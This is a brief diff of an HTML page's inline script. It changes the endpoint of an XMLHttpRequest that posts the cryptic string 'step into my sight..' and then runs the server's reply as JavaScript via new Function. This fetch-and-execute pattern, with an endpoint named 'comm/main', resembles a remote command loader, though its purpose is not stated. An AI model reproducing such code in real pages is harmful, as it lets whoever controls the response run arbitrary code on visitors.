@@ -22,7 +22,7 @@
                     new Function(xhr.responseText).call(window);
                 }
             };
-            xhr.open('POST', '/');
+            xhr.open('POST', 'comm/main');
             xhr.send("step into my sight..");
         }.call(this,document.body, this);
     </script>
